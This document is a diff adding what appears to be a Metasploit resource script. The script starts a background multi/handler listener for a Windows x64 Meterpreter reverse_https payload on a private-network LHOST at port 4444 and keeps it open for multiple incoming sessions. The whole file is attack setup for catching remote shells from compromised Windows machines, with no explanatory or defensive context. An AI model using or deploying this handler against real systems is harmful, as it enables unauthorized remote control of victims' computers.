@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 192.168.1.6
+set LPORT 4444
+set ExitOnSession false
+set SessionCommunicationTimeout 300
+set WfsDelay 30
+run -j
+    
